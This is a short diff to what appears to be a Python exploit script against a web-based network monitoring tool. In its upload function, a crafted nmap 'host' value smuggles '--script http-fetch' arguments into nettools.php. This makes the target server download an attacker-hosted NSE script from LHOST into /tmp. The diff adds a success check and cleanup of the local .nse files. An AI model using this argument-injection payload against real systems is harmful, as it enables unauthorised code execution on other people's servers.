@@ -61,8 +61,18 @@ def upload():
 	cookies = {'services_limit':'100'}
 	p1 = {"nmap":"on","nmap_options":"-v "+LPORT,"host":LHOST+" --script http-fetch --script-args http-fetch.destination=/tmp,http-fetch.url="+script}
 	req1 = requests.post(SRV+"/opmon/nettools/nettools.php", cookies=cookies, data=p1, verify=False)
+	#print(req1.text)
+	
+	if "Successfully Downloaded" in req1.text:
+		pass
+	else:
+		print("[!] The server is not vulnerable")
+		os.system('rm *.nse')
+		sys.exit()
+
 	if "Failed to resolve" in req1.text:
 		print("[!] The server not have external connections")
+		os.system('rm *.nse')
 		sys.exit()
 
 def execute():
